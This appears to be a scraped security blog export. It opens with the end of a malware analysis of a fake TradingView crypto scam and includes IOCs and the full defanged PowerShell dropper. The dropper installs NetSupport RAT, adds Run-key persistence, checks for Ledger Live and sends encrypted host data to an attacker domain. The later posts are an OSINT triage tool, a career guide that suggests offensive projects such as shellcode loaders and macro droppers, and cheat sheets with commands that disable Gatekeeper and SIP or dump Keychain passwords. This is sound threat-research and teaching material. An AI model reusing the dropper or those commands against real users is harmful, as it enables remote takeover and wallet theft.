highlighting, and page layout resembling trusted developer platforms like GitHub Gist or Pastebin. copycode[.]io clearly had serious work put into it likely involving image generation to create branded assets and filler content. The site didn’t raise red flags until I tried to click on the links at the bottom of the page, and they didn\u0026rsquo;t go anywhere. It wasn\u0026rsquo;t trying to sell anything, just present itself as a clean code repository.\nThe Instructions Were Technical, But Approachable # Another standout point: the process they described was exactly the kind of arcane but plausible series of steps you\u0026rsquo;d expect when enabling a hidden beta feature.\nSteps like:\nInstalling the TradingView desktop app Running a command in Terminal or Command Prompt Pulling from a trusted-looking .io code site I suspect none of this steps would raise red flags for users who are just technical enough to be trading crypto, but not trained in IT or cyber security. These weren’t dumbed-down steps aimed at the average Facebook user. These were tailored to crypto-savvy, semi-technical users.\nI’ll be honest even as an experienced cyber security analyst, after 10–20 minutes of analysis, I was still leaning toward “maybe TradingView really did get hacked.” That’s how convincing it was.\nAll of it added up to something that didn\u0026rsquo;t just \u0026ldquo;look legitimate\u0026rdquo;, but it felt familiar, and that’s what made it dangerous.\nIOC\u0026rsquo;s # Type Indicator Domain copycode[.]io Domain betamode[.]app C2 Domain sonosarcs[.]com IP Address 185.203.241[.]195 File SHA256 client32.exe 31804c48f9294c9fa7c165c89e487bfbebeda6daf3244ad30b93122bf933c79c Registry Key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\NuClient Annex A: (I have defanged the links, but its still malware so be warned) # if (Test-Path \u0026#34;$env:APPDATA\\Nt\\client32.ini\u0026#34;) { Write-Host \u0026#34;Beta access temporarily paused due to high demand. Try again in 72 hours.\u0026#34; -ForegroundColor Red exit } $ntFolderPath = Join-Path $env:APPDATA \u0026#34;Nt\u0026#34; if (!(Test-Path $ntFolderPath)) { New-Item -Path $ntFolderPath -ItemType Directory -Force | Out-Null } Set-Location $ntFolderPath $filesToDownload = @( \u0026#34;AudioCapture.dll\u0026#34;, \u0026#34;client32.exe\u0026#34;, \u0026#34;client32.ini\u0026#34;, \u0026#34;client32u.ini\u0026#34;, \u0026#34;HTCTL32.DLL\u0026#34;, \u0026#34;msvcr100.dll\u0026#34;, \u0026#34;nskbfltr.inf\u0026#34;, \u0026#34;NSM.ini\u0026#34;, \u0026#34;NSM.LIC\u0026#34;, \u0026#34;nsm_vpro.ini\u0026#34;, \u0026#34;pcicapi.dll\u0026#34;, \u0026#34;PCICHEK.DLL\u0026#34;, \u0026#34;PCICL32.DLL\u0026#34;, \u0026#34;remcmdstub.exe\u0026#34;, \u0026#34;TCCTL32.DLL\u0026#34; ) $headers = @{ } foreach ($file in $filesToDownload) { $url = \u0026#34;https://bet\u0026#34;+\u0026#34;amode[.]app/$file\u0026#34; $output = Join-Path $ntFolderPath $file try { Invoke-WebRequest -Uri $url -OutFile $output -Headers $headers -UseBasicParsing } catch {} } Set-Location \u0026#34;$env:AppData\\Nt\u0026#34; $exePath = \u0026#34;$env:APPDATA\\Nt\\client32.exe\u0026#34; Start-Sleep -Seconds 2 if (Test-Path $exePath) { try { Set-ItemProperty -Path \u0026#34;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34; -Name \u0026#34;NuClient\u0026#34; -Value $exePath Start-Process $exePath } catch {} } $appDataPath = [Environment]::GetFolderPath(\u0026#39;ApplicationData\u0026#39;) $ledgerPath = Join-Path $appDataPath \u0026#34;Ledger Live\u0026#34; $ledgerExists = Test-Path $ledgerPath $keyBase64 = \u0026#39;w7E9wVX3GE5fPymZn4+1Y4QoyaqzZ6zJtqCHXn0RAzM=\u0026#39; function Encrypt-String { param ( [string]$plainText, [string]$keyBase64 ) $aes = [System.Security.Cryptography.Aes]::Create() $aes.Mode = \u0026#39;CBC\u0026#39; $aes.Padding = \u0026#39;PKCS7\u0026#39; $aes.Key = [Convert]::FromBase64String($keyBase64) $aes.GenerateIV() $iv = $aes.IV $encryptor = $aes.CreateEncryptor() $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText) $cipherBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length) return [Convert]::ToBase64String($iv + $cipherBytes) } $appDataPath = [Environment]::GetFolderPath(\u0026#39;ApplicationData\u0026#39;) $ledgerPath = Join-Path $appDataPath \u0026#34;Ledger Live\u0026#34; $ledgerExists = Test-Path $ledgerPath $computerName = $env:COMPUTERNAME if ($ledgerExists) { $postData = \u0026#34;$computerName + Ledger Live\u0026#34; } else { $postData = $computerName } $encryptedData = Encrypt-String -plainText $postData -keyBase64 $keyBase64 $url = \u0026#34;https://beta\u0026#34;+\u0026#34;mode[.]app/info2.php\u0026#34; try { Invoke-RestMethod -Uri $url -Method Post -Body @{data = $encryptedData} } catch { } Write-Host \u0026#34;Beta access temporarily paused due to high demand. Try again in 72 hours.\u0026#34; -ForegroundColor Red ","date":"2 July 2025","externalUrl":null,"permalink":"/posts/crypto_scam_returns/","section":"Blog","summary":"A polished YouTube video promoting a fake TradingView AI feature nearly fooled security analysts with professional branding and clever social engineering, delivering NetSupport RAT through PowerShell to target crypto wallets.","title":"A Familiar Crypto Scam Returns — With a More Convincing Face","type":"posts"},{"content":"Whether you\u0026rsquo;re triaging phishing domains or chasing infrastructure from an IOC, time matters. I built NetTriage to automate the repetitive but essential steps we all take during IP/domain investigations and to complement the cheat sheet I posted earlier.\nThis post covers how to use the tool, how it ties into an investigation workflow, and goes through a real world case to demonstrate how to identify suspicious behaviour and infrastructure traits.\nWhat Is NetTriage? # NetTriage is a Python tool that automates reputation lookups, DNS resolution, WHOIS checks, passive DNS, certificate transparency, and more. It helps answer the key questions quickly:\nIs this IP known malicious? Is this domain newly registered or have suspicious DNS Records? Does it point to cloud infrastructure, a VPN, or a TOR node? Are there passive or historical DNS/WHOIS records? Are there redirect chains, shortened URLs, or payloads involved? Why Use It? # NetTriage speeds up OSINT investigations and gives analysts:\nA full profile of a domain or IP from multiple angles Clear output with minimal input Separation of IP vs domain logic Highlighting of common red flags and suspicious indicators It complements any incident response, threat hunting, or phishing triage workflow.\nInstallation \u0026amp; Setup # Download the NetTriage.py file from my GitHub\nRequirements # Python 3.10+ Install dependencies: pip install -r requirements.txt API Keys # The following API keys are required for full functionality. Don’t worry if you don’t have all of them, the tool will automatically skip any services that are not configured.\nService API Key Available Notes AbuseIPDB Yes Free up to 1,000 queries/day GreyNoise Yes Use the community API VirusTotal Yes Paid API required Shodan Yes Paid API required URLScan.io Yes Free, but key is required Censys Yes Free tier available SecurityTrails Yes Basic WHOIS/subdomain access Note: The free tier of most of these APIs is not for commercial use. Please purchase a paid tier if you wish to use this script for commercial purposes.\nI was lazy and hardcoded my API keys, definitely not best practice. Do yourself a favour and use environment variables instead, like this:\nVT_API_KEY = os.getenv(\u0026quot;VT_API_KEY\u0026quot;)\nIt\u0026rsquo;s safer, cleaner, and won’t make future-you cry.\nUsage # python3 NetTriage.py example.com python3 NetTriage.py 8.8.8.8 --verbose python3 NetTriage.py http://malicious.url --expand --verbose: show full API JSON responses --expand: trace URL redirects (use in a VM) Just a heads-up: this sends an actual request to the domain, so there’s some risk involved. Please only run this with a VM + VPN combo. Don’t go poking shady URLs bare-handed! Investigation Steps (With NetTriage) # Step 1: Triage the Target # Use AbuseIPDB for IP reputation and abuse history Use URLScan.io to look at screenshots, scripts, and redirection Ask: Does it look like a normal site? Are there weird or unexpected behaviours? Step 2: Reputation Checks # Use GreyNoise, IPVoid, Hunting.abuse.ch Look for tags like vpn, proxy, scanner, cloud provider, residential or tor Check blacklists and passive sightings Step 3: DNS \u0026amp; WHOIS # Fetch DNS records: A, MX, NS, TXT, CNAME Use SecurityTrails, whois, crt.sh Look for: Newly registered domains (\u0026lt;30 days) WHOIS privacy or redacted details Short expiry windows (common for disposable domains) Subdomains or wildcard records Step 4: Certificate Transparency # Use crt.sh, Censys Find SSL cert reuse across suspicious infrastructure Pivot from cert to other domains Step 5: VirusTotal Graph # Query IP or domain Look for: High detection counts Related samples Behavioral graph activity Step 6: Payload Retrieval (Safely) # Browserling: View JS-heavy sites in a sandbox curl -vL or --expand option: Watch redirects Let\u0026rsquo;s see an Example # Grabbing a Domain from the recent deep-dive I did into some Crypto Malware here\npython3 NetTriage.py sonosarcs[.]com\nAnd it outputs:\n🔍 Investigating: sonosarcs.com Resolved Hostname: sonosarcs.com Resolved IP: 185.203.241.103 === IP Analysis === [AbuseIPDB] - Reports: 0 - Abuse Confidence Score: 0% - ISP: Podaon SIA - Usage Type: Data Center/Web Hosting/Transit - ASN: N/A - Domain Name: podaon.com - Country: N/A - Link: https://www.abuseipdb.com/check/185.203.241.103 [GreyNoise] - Name: N/A - Classification: N/A - Tags: None - Link: https://viz.greynoise.io/ip/185.203.241.103 [ipinfo.io] - City: Oude Meer - Org: AS211381 Podaon SIA - ASN: N/A - Link: https://ipinfo.io/185.203.241.103 [Shodan] - Org: Podaon SIA - OS: Windows Server 2019 (version 1809) (build 10.0.17763) - Open Ports: [8080, 5986] - Link: https://www.shodan.io/host/185.203.241.103 [Censys] [Censys] API credentials not set. Check manually: https://search.censys.io/hosts/185.203.241.103 [IPVoid] - Detection count not found. - Link: https://www.ipvoid.com/ip-blacklist-check/?ip=185.203.241.103 === Domain/URL Intelligence === [VirusTotal] - Harmless: 60 - Malicious: 2 - Suspicious: 0 - Link: https://www.virustotal.com/gui/search/sonosarcs.com [WHOIS] - Domain: SONOSARCS.COM - Registrar: Web Commerce Communications Limited dba WebNic.cc - Creation Date: 2025-06-18 10:57:23 ⚠️ Domain is newly registered! - Expiry Date: 2028-06-18 10:57:23 - Name Servers: JOHN.NS.CLOUDFLARE.COM, MAGDALENA.NS.CLOUDFLARE.COM - WHOIS Link: https://who.is/whois/sonosarcs.com [crt.sh] - Found 3 certificates - Link: https://crt.sh/?q=%25.sonosarcs.com [Hunting.abuse.ch] - No results for: sonosarcs.com [SecurityTrails] - Registrar: N/A - Created: N/A - Updated: N/A - Subdomains: www - Link: https://securitytrails.com/domain/sonosarcs.com [URLScan.io] - Found 0 scan(s) for domain: sonosarcs.com - Submit new scan: https://urlscan.io/#submit-form=sonosarcs.com [DNS Records] A records: - 185.203.241.103 NS records: - john.ns.cloudflare.com. - magdalena.ns.cloudflare.com. [Browserling] - Open in Browserling: https://www.browserling.com/browse/win/7/https://onosarcs.com From this output, we can see that although only 2 engines flagged the domain as malicious on VirusTotal, that\u0026rsquo;s often not enough to label it cleanly, thats why using a multi-tool approach is so important.\nA few red flags we can pick out:\nHosting: The IP is hosted by Podaon SIA, a VPS provider. With some pivoting, you\u0026rsquo;ll find this host sells cheap VPS infrastructure, a common choice for threat actors to host malware or phishing infrastructure anonymously.\nWHOIS: The domain is newly registered (within the last two weeks), which is a classic trait of constantly rotating scam/c2 infrastructure.\nOpen Ports: Shodan shows open ports like 5986 and 8080, but not 443, which is the common port for https websites.\nNo scans in URLScan.io, no reputation yet, often a sign the domain hasn’t been seen in the wild much.\nIndicators of a Suspicious Website # Category Red Flags Hosting Use of CDN or bulletproof hosting (BPH); VPS with anonymous registration Domain New registration, strange TLD (.zip, .cyou), WHOIS privacy, homoglyph use IP TOR/VPN detected, cloud-hosted, blacklisted, reverse DNS mismatch URL Shortened links, IP-based URLs, base64 params, large redirect count DNS Fast-flux patterns, wildcard abuse, sudden NXDOMAIN spikes Page Obfuscated JavaScript, fake login forms, invisible iframes Certs Self-signed certs, reused certs across infra Quick note on defanging:\nAlways defang malicious indicators when sharing them internally, that’s just good hygiene. e.g. http://www.malicious[.]com/bad/path\nBut seriously, you only need to defang the top-level domain. Please, please, please stop defanging every single subdomain\u0026hellip; it’s not only painful to look at, but it also wastes time during testing, scanning, or analysis when we have to refang everything just to make it usable.\nBonus: My Full Cheat Sheet # For more in-depth investigation commands and reference material, check out:\nIP \u0026amp; Domain Investigation Cheat Sheet\nCovers:\nwhois, dig, nslookup basics curl flags for headers, tracing, decoding IP classes, ranges, and CIDR breakdowns Investigation workflows and behavioural signals Final Thoughts # NetTriage is a side-project born from need: I was tired of bouncing between tabs. If it saves you time or catches something you might\u0026rsquo;ve missed, it’s done its job.\nSuggestions, or feature ideas welcome.\n","date":"1 July 2025","externalUrl":null,"permalink":"/posts/openscanner/","section":"Blog","summary":"Automate IP and domain investigations with NetTriage, a Python tool that performs reputation lookups, DNS resolution, WHOIS checks, and passive DNS analysis for rapid threat triage.","title":"Using NetTriage for IP \u0026 Domain Triage","type":"posts"},{"content":" A Guide to Starting in Both Red and Blue Team Operations (Australian Edition) # Cybersecurity is a rapidly expanding and deeply technical field, and it can be difficult to know where to begin. Whether you\u0026rsquo;re a student, a career-changer, or just exploring your interests, this guide aims to provide a comprehensive yet beginner-friendly overview of the core concepts, career paths, and practical steps you can take right now to build your future in cyber security.\nRed Team vs Blue Team: Understanding the Two Core Paths # The first decision you’ll want to consider is whether you\u0026rsquo;re more interested in red teaming or blue teaming. These terms define the two primary functions within cyber security.\nMost people are drawn to red teaming because it\u0026rsquo;s exciting and popularised in media. But it’s important to note that red teaming is difficult to break into without a deep skillset, and often experience that’s hard to acquire without breaking any laws when starting out.\nIf you’re just starting, blue team work is the better entry point. It teaches you how systems work, how attackers behave, and how to build resilient networks. You can always pivot to red team work later once you understand the defensive side.\nRed Team: Offensive Security # Red teams simulate attacks to uncover security weaknesses. Their goal is to think and act like a hacker, identifying vulnerabilities before real attackers do.\nCore Activities: Penetration testing (\u0026ldquo;pentesting\u0026rdquo;) Social engineering Exploit development Bypassing antivirus and detection systems Bug Bounties Common Tools: Metasploit, Cobalt Strike, Burp Suite, Nmap Programming Languages: C (\u0026amp; C++) \u0026gt; PowerShell \u0026gt; Python \u0026gt; JavaScript \u0026gt; VBScript Important Note: Offensive skills require a strong ethical grounding. Writing malware or exploring exploits can quickly cross legal boundaries. Always test in isolated virtual labs you own and operate.\nBlue Team: Defensive Security # Blue teams are responsible for detecting and responding to real threats. They monitor networks, analyse logs, and respond to incidents.\nCore Activities: Network monitoring Security operations Digital forensics Threat hunting Incident response and recovery Common Tools: Splunk/ELK stack, Wireshark, EZ Tools, Flare/Remnux, FTK/Autopsy Programming Languages: PowerShell \u0026gt; Python \u0026gt; Assembly Blue team roles offer a more accessible entry point and are often better supported by structured learning and job pathways.\nWhere to Start # While a cyber security degree can help open doors like internships or entry-level analyst roles these opportunities are rare compared to the number of applicants. Many university courses in Australia are still behind the times: content is often outdated, too theoretical, and misses key practical elements. That said, a degree is sometimes a requirement for roles in government (non-military) and management/leadership positions, so it can still be valuable depending on your career goals.\nIn all honesty, your time will likely be better spent gaining practical skills, working on real-world projects. If you\u0026rsquo;re considering uni, I recommend first getting some hands-on experience and a couple of certifications under your belt. Build up a solid portfolio whether it\u0026rsquo;s malware analysis, scripting projects, PowerShell tools, or red/blue team utilities. Write a few blog (or LinkedIn) posts explaining what you’ve learned or built; it gets your name out there and shows you\u0026rsquo;re serious.\nMy Guide to Developing the Key Skills — The Better Way # Instead of waiting for a uni assignment or outdated course content, take control of your learning and start building real skills now. The cyber security field rewards initiative, curiosity, and hands-on ability far more than just ticking academic boxes. Here’s how I recommend you go about it:\nDevelop an Understanding Windows Internals and Networking # You don’t need to be an expert, but having a solid grasp of how operating systems and networks function is essential in cybersecurity. This knowledge helps you understand how attacks work, where to look for suspicious activity, and how to design effective defences.\nWindows Internals # Logging and Monitoring: Learn how Windows records system activity through tools like Event Viewer, Sysmon, and Windows Security logs. Understanding what normal looks like helps you spot anomalies. API Calls and System Interaction: Study how applications use Windows APIs to perform tasks, how processes communicate, and how attackers might abuse these calls to escalate privileges or maintain persistence. Common Attack Vectors: Familiarise yourself with typical Windows attack paths such as Windows Management Instrumentation (WMI), Windows services, registry modifications, scheduled tasks, and DLL injection techniques. Knowing these helps in detecting and blocking malicious activities. Networking Fundamentals # OSI Model \u0026amp; TCP/IP Stack: Understand the layered structure of network communications from physical connections up to application protocols. This helps when analysing where and how data flows or is intercepted. Common Protocols: Get comfortable with protocols like HTTP/S (web traffic), DNS (name resolution), FTP (file transfers), SSH (secure remote access), and SMB (file sharing), as these are frequently involved in both attacks and normal operations; being able to tell them apart is crucial. Traffic Analysis Tools: Learn to use packet capture tools such as Wireshark and tcpdump to inspect network traffic. These allow you to identify unusual patterns, malicious payloads, or data exfiltration attempts. Mastering these basics creates a strong foundation for both red and blue team activities from crafting exploits to building detection rules and ultimately helps you become a more effective cybersecurity professional.\nNow for the Cyber Skills # There are countless platforms out there, but here are some of the most effective and affordable options to get hands-on experience, learn real-world skills, and build your cyber skills:\nHands-On Labs # Hack The Box\nIndustry-recognised virtual labs and certification pathways. Offers a 14-day free trial and student discounts. Great for developing offensive and defensive skills. Their CDSA certification is highly regarded for entry-level SOC positions. TryHackMe\nPerfect for beginners with guided learning paths. Gamified and browser-based labs make learning interactive and fun. TCM Security Academy\nOffers semi-affordable, practical courses covering real-world techniques. Their PNPT certification is highly regarded for entry-level red teamers. Theoretical Courses # CompTIA Security+\nA foundational cert that covers key cyber concepts. Even if you don\u0026rsquo;t take the exam, studying the content gives you a strong baseline. Google Cybersecurity Certificate A beginner-friendly option that introduces you to key concepts. More suited for general IT/cyber foundations, but a decent starting point if you\u0026rsquo;re just entering the field. All Things Cyber Certifications # Use this map to plan your learning path, compare options, explore what excites you at your current skill level, and find your next goal. Continuously conduct SWOT analyses of your skill set and plan your next steps accordingly.\nPaul Jerimy\u0026rsquo;s Certification Roadmap One of the best resources to get a full picture of the certification landscape. Covers everything from entry-level to expert certs, organised by skill domain and difficulty level. It can look overwhelming at first, but take the time to explore, there’s something in there for everyone, no matter where you\u0026rsquo;re at in your journey. Video Guides # For the visual learners these videos are packed with great advice on structuring your own learning path. Great if you\u0026rsquo;re unsure where to begin or just want to sanity check your own plan.\nThe Hacker’s Roadmap – How to Get Started in 2025 How I Would Learn Cyber Security in 2025 Bonus Skills: Programming for Cyber Security # Programming is an essential tool in your cyber toolkit. Whether defending systems or testing their limits, being comfortable with code enables you to automate workflows, develop custom tools, analyse malware, and simulate real-world attacks or defences.\nIf you want that leg up over the entry-level competition start creating a portfolio to showcase your programming skills. Pick a programming language (or two) from the lists below and develop a new project. This will also help you develop and improve your own skills, the best way to learn is simply to start doing it. Cybersecurity is all about teaching yourself, experimenting, and constantly improving.\nHere are some starter ideas to get you going. Once you’ve built something, upload it to a public GitHub repository. Sharing your work not only helps you secure a job but also strengthens the whole cybersecurity community by developing open-source tools, making it harder for hackers to succeed.\nFor the Blue Team: # Priority Programming Languages:\nPowerShell: Key for automating incident response tasks, querying system info, managing services, and detecting persistence on Windows systems. Python: Ideal for just about everything, from log parsing, threat hunting, malware analysis, querying threat intel APIs, and building dashboards or automation tools. Assembly: Important for understanding malware at the binary level; this is a hard skill to master but makes you invaluable for reverse engineering suspicious code. Blue Team Project Ideas:\nActive Directory Audit Script: Use PowerShell to enumerate users, groups, privileges, and trust relationships, automating detection of misconfigurations or privilege escalations. PDF Malware Scanner: Develop a Python script that scans PDF metadata and embedded objects for signs of malicious content. Deobfuscation Tool: Build a script to decode common obfuscation methods adversaries use, such as base64 or hex encoding, to reveal hidden commands or code. IP/Domain Scanner: Create a tool that enriches IP addresses or domains with public data like WHOIS, geolocation, and reputation to quickly assess potential threats. For the Red Team (Offensive Security): # Priority Programming Languages:\nC / C++: Critical for writing custom implants, loaders, and interacting directly with system APIs or developing offensive tooling like DLL injectors. PowerShell: Still widely used for in-memory execution, post-exploitation modules, and lateral movement, especially with frameworks like PowerSploit or Empire. Python: Useful for scripting exploits, writing custom C2 clients, or prototyping offensive tools. JavaScript: Key for client-side attacks such as XSS, HTML smuggling, and web exploitation. VBScript: Though outdated, it’s still viable for crafting phishing payloads or for bypassing signature-based defences in older environments. Red Team Project Ideas:\nCustom C2 Framework: Build a lightweight C-based command-and-control client that uses encrypted beaconing. In-Memory Loader: Create a PowerShell script that fetches and executes shellcode in memory (e.g. using Invoke-Expression or Reflection). JavaScript Payload Generator: Write a tool that generates obfuscated JS payloads for testing XSS filters. Macro Dropper Builder: Combine VBScript and PowerShell to deliver payloads via Office macros in simulated phishing engagements. Combine Skills in Practical Projects: # Blending defensive and offensive perspectives leads to a deeper understanding of threats and mitigations.\nEvent Log Anomaly Detector: Develop a PowerShell script that flags anomalous logon attempts or service installations based on baselines, then practice developing malicious scripts which avoid triggering any alerts or remove any traces it leaves in logs. C2 Detection Emulator: Write a basic C2 and find it with WireShark then build a corresponding detection rule set. Signature Development and Bypass: Use your knowledge of malicious code to identify common patterns in Dropper then build YARA/Sigma rules for detection, then creating your own unique dropper to bypass it. Developing tools like these not only solidifies your technical skills but also demonstrates practical capabilities crucial for portfolios, team contributions, and advancing in both offensive and defensive roles.\nNow its time to start applying for job!\nWorking in Australian Cyber Security # Getting a start in cyber can be difficult but starting the the Government or Military sectors can help you break into the industry.\nIn Australia, much of the government-focused cybersecurity work falls under the Australian Signals Directorate (ASD), which plays a central role in protecting national security through cyber defence and intelligence operations.\nBlue Team: ACSC # The Australian Cyber Security Centre (ACSC) is the defensive arm of ASD. They secure Australian businesses and government departments from cyber threats. Lots of cadetship or early career opportunities will be in the ACSC. Red Team: Offensive Operations # While more exclusive, ASD\u0026rsquo;s red team has conducted major operations against criminal and state-based actors. Two major declassified operations include: How intelligence agencies catch criminals | ABC News How Australian spies tracked down Russian cyber-gang | 9 News Australia Other key players include:\nAustralian Federal Police (AFP): Responsible for investigating cybercrime and enforcing cyber laws across Australia. Australian Defence Force (ADF): The ADF includes specialised cyber capabilities tasked with cyber operations to protect military assets and support national defence objectives. This is where I cut my teeth, while it’s not for everyone, if you can handle the military environment, it’s an excellent way to receive world-class training. If you considering joining I would encourage you to go with the Air Force as it has the most developed cyber capability within the ADF. Final Thoughts: Building Your Cyber Future # Cyber security combines creativity, problem-solving, and technical skill. You don’t need to know everything to begin, but consistency and curiosity will take you far.\nQuick Start Checklist: # Decide if you want to focus on Red Team (offence) or Blue Team (defence) Study Windows internals and networking fundamentals Start a beginner-friendly lab like Hack The Box or TryHackMe Learn a scripting language such as Python or PowerShell Build and publish small projects (e.g., log parser, PDF scanner) Explore certification roadmaps and create a career plan. My final recommendation is to do everything you can to work towards certifications like CompTIA Security+ and the Hack The Box CDSA. It’s challenging, but if you succeed, you’ll be far more valuable than any fresh uni graduate in a SOC environment.\nRemember: start simple, stay ethical, and always keep learning.\nGot questions or want feedback on your learning path? Drop me an email — I’m always happy to chat.\n","date":"28 June 2025","externalUrl":null,"permalink":"/posts/cyber_security_beginner_guide/","section":"Blog","summary":"A comprehensive Australian guide to breaking into cybersecurity, covering red vs blue team paths, practical skills development, certifications, programming projects, and government career opportunities.","title":"Getting Started in Cyber Security","type":"posts"},{"content":"This macOS Terminal cheat sheet summarises critical shell commands and scripting techniques for macOS users involved in administration, development, and security tasks. It covers file system navigation, process monitoring, networking, Homebrew usage, and system security settings like Gatekeeper and SIP. Ideal for Apple-focused sysadmins, DFIR practitioners, and macOS power users.\nBasics – File \u0026amp; Directory Operations # pwd # Print current directory ls # List directory contents ls -la # Long listing incl. hidden files cd /path/to/dir # Change directory cd ~ # Home directory cd - # Previous directory cd .. # Up one directory mkdir newfolder # Create folder touch file.txt # Create empty file cp source dest # Copy files or directories mv old new # Move/rename rm file.txt # Delete file rm -rf folder/ # Recursively delete folder (dangerous) Search, Filters, and Viewing # nano file.txt # Open file in nano text editor cat file.txt # View file contents less file.txt # Scrollable file viewer head -n 10 file.txt # First 10 lines tail -n 10 file.txt # Last 10 lines grep \u0026#34;text\u0026#34; file.txt # Search text in file find . -name \u0026#34;*.log\u0026#34; # Find all .log files from current dir Sorting and Counting # sort filename.txt | uniq # Remove duplicate lines sort filename.txt | uniq -c # Count occurrences of each unique line sort filename.txt | uniq -c | sort -nr # Count and sort by most frequent cat filename.txt | grep -i \u0026#34;Search\u0026#34; | sort | uniq # Filter, sort, then remove duplicates System Info \u0026amp; Processes # top # Real-time system monitor ps aux # List all running processes ps -ef | grep name # Search process list uptime # System uptime whoami # Current user hostname # System hostname sw_vers # macOS version Network Commands # ifconfig # Network interfaces netstat -an # Network connections lsof -i :port # Processes using a specific port ping 8.8.8.8 # ICMP test curl http://example.com # Fetch content from URL dig domain.com # DNS lookup Permissions \u0026amp; Ownership # chmod +x script.sh # Make file executable chmod 755 file # rwxr-xr-x (owner can write/execute) chown user:group file # Change file owner sudo su # Switch to root (if enabled) sudo -s # Root shell App \u0026amp; Service Management # open . # Open Finder at current path open file.pdf # Open with default app open -a \u0026#34;App Name\u0026#34; # Open app from CLI killall Safari # Kill app by name pkill -f processname # Kill by process string match Package Managers # brew install packagename # Install software brew update \u0026amp;\u0026amp; brew upgrade # Update packages brew list # List installed packages brew uninstall packagename # Remove package Gatekeeper, SIP \u0026amp; Security Controls # These can weaken system security. Use with understanding and caution.\n# Remove quarantine attribute from downloaded files (Safer then below) xattr -d com.apple.quarantine /path/to/script # Disable Gatekeeper sudo spctl --master-disable # Check Gatekeeper status sudo spctl --status # Re-enable Gatekeeper sudo spctl --master-enable Must be done from Recovery Mode to disable SIP:\n# Disable SIP csrutil disable # Re-enable SIP csrutil enable # Disable TCC for a specific app (not recommended unless testing) tccutil reset All com.app.bundleid Scripting \u0026amp; Automation # #!/bin/bash echo \u0026#34;Hello macOS\u0026#34; # Make script executable and run chmod +x script.sh ./script.sh Hidden Files \u0026amp; System Files # # Show hidden files defaults write com.apple.finder AppleShowAllFiles -bool true killall Finder # Hide hidden files defaults write com.apple.finder AppleShowAllFiles -bool false killall Finder Disk \u0026amp; Mounting # diskutil list # List all disks/partitions diskutil mount /dev/disk2s1 # Mount disk diskutil unmount /dev/disk2s1 # Unmount disk Passwords \u0026amp; Keychain # security find-generic-password -ga \u0026#34;accountname\u0026#34; # Show saved password (may prompt) Misc # date # Show date/time history # Show command history clear # Clear terminal screen Suggested Tools # Tool Purpose Homebrew Package manager Little Snitch Network monitor KnockKnock Persistency inspector BlockBlock Detects auto-run locations osquery Query OS like a database ","date":"16 June 2025","externalUrl":null,"permalink":"/posts/macos_terminal_cheatsheet/","section":"Blog","summary":"Essential macOS Terminal commands for file operations, process management, networking, Homebrew, and security controls like Gatekeeper and SIP for sysadmins and DFIR practitioners.","title":"MacOS CLI Commands Cheat Sheet","type":"posts"},{"content":"Content from The Markdown Guide\nBasic Syntax # # Heading 1 ## Heading 2 ### Heading 3 **bold text** *italicized text* \u0026gt; blockquote 1. First item 2. Second item 3. Third item - First item - Second item - Third item `code` --- [Markdown Guide](https://www.markdownguide.org) ![alt text](https://www.markdownguide.org/assets/images/tux.png) Rendered:\nHeading 1 # Heading 2 # Heading 3 # bold text\nitalicized text\nblockquote\nFirst item Second item Third item First item Second item Third item code\nMarkdown Guide\nExtended Syntax # | Syntax | Description | |------------|-------------| | Header | Title | | Paragraph | Text | ```json # Fenced Code Block { \u0026#34;firstName\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;Smith\u0026#34;, \u0026#34;age\u0026#34;: 25 } ``` Here\u0026#39;s a sentence with a footnote. 1 [^1]: This is the footnote. ### My Great Heading {#custom-id}`| # Creating an ID to refer to headings with term : definition ~~The world is flat.~~ # Strike Through I need to highlight these ==very important words==. - [x] Write the press release # Task List - [ ] Update the website - [ ] Contact the media That is so funny! :joy: # Emoji H~2~O # Subscript X^2^ # Superscript Rendered (The one my website can render atleast):\nSyntax Description Header Title Paragraph Text { \u0026#34;firstName\u0026#34;: \u0026#34;John\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;Smith\u0026#34;, \u0026#34;age\u0026#34;: 25 } Here\u0026rsquo;s a sentence with a footnote. 1\nMy Great Heading # The world is flat.\nWrite the press release Update the website Contact the media Useful Tools # Tool Purpose / Description Obsidian Note-taking app using Markdown files with powerful linking Visual Studio Code Code editor with Markdown preview and extensions Markdown Preview Enhanced VS Code extension for advanced Markdown rendering Grip GitHub Readme Instant Preview — renders Markdown as GitHub would Pandoc Converts Markdown to/from many formats (PDF, DOCX, HTML, LaTeX\u0026hellip;) MarkdownLint Linter for Markdown — checks style, formatting rules mdBook Create books or documentation from Markdown files Docsify Generate docs websites from Markdown files markdown-pdf CLI tool to convert Markdown to PDF using Node.js ","date":"10 June 2025","externalUrl":null,"permalink":"/posts/markdown_cheat_sheet/","section":"Blog","summary":"Quick reference for Markdown syntax covering headings, formatting, lists, links, code blocks, and tables for documentation and technical writing.","title":"Markdown Cheatsheet","type":"posts"},{"content":"This PowerShell cheat sheet is your fast-access reference for essential Windows CLI commands used in system administration, task automation, security auditing, and endpoint analysis. From file and process management to networking, scripting, and package control with Winget, this guide empowers both IT professionals and security analysts to work more efficiently with the Windows command line.\nBasics – File \u0026amp; Directory Operations # pwd # Get-Location – Print current directory ls # Get-ChildItem – List directory contents ls -Force # Get-ChildItem -Force – Include hidden files cd C:\\Path\\To\\Dir # Set-Location – Change directory cd ~ # Set-Location ~ – Go to home/profile dir cd .. # Go up one directory mkdir NewFolder # New-Item -ItemType Directory – Create folder ni file.txt # New-Item file.txt – Create empty file cp source.txt dest.txt # Copy-Item – Copy file mv old.txt new.txt # Move-Item – Move or rename rm file.txt # Remove-Item – Delete file rm -r -fo folder # Remove-Item -Recurse -Force – Delete folder recursively (dangerous) Search, Filters, and Viewing # code file.txt # Open in VSCode (Requires environment Var) cat file.txt # Get-Content – View file contents cat file.txt | select -f 10 # Get-Content -Head 10 – First 10 lines cat file.txt | select -l 10 # Get-Content -Tail 10 – Last 10 lines sls \u0026#34;text\u0026#34; file.txt # Select-String – Search text in file ls -r -fi *.log # Get-ChildItem -Recurse -Filter *.log – Find log files Sorting and Counting # cat filename.txt | sort -u # Sort-Object | Get-Unique – Remove duplicates cat filename.txt | group | sort Count -desc # Group-Object | Sort-Object – Count + sort sls \u0026#34;Search\u0026#34; filename.txt | sort -u # Search, sort, unique lines System Info \u0026amp; Processes # 